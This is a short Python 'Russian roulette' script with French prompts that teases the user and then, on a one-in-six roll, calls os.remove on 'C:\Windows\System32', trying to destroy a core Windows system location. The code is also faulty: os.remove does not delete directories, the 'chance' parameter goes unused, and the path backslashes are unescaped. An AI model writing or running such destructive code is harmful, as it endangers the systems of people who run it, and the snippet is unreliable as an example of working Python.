import os
import random

str(input("hey Bienvenu dans ma roullette russe veux tu jouer avec moi ?"))
str(input("de toute façon m'en fous on va quand même jouer tu est prêt ?"))


def supprimer_avec_chance(file_path, chance):
    if random.randint(1, 6) == 1:
        os.remove(file_path)
        print(f"Le fichier {file_path} a été supprimé.")
    else:
        print(f"Le fichier {file_path} n'a pas été supprimé.")

file_path = "C:\Windows\System32"

chance = 1

supprimer_avec_chance(file_path, chance)
